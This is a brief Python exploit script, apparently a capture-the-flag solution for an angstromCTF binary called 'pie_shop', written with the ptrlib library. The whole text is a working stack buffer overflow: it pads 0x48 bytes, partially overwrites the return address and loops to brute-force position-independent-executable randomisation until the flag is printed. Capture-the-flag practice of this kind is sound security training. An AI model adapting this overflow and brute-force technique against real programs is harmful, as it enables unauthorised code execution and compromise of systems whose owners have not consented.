from ptrlib import *

elf = ELF("./pie_shop")

while True:
    #sock = Socket("shell.actf.co", 19306)
    sock = Process("./pie_shop")
    payload = 'A' * 0x48
    payload += '\xa9\x21\x11'
    sock.recvuntil("What type of pie do you want? ")
    sock.sendline(payload)
    sock.recvline()
    l = sock.recv(timeout=1.0)
    if l is None:
        print(sock.recv(timeout=1.0))
        sock.close()
        continue
    elif b'actf' in l:
        print(l)
        break
    sock.close()
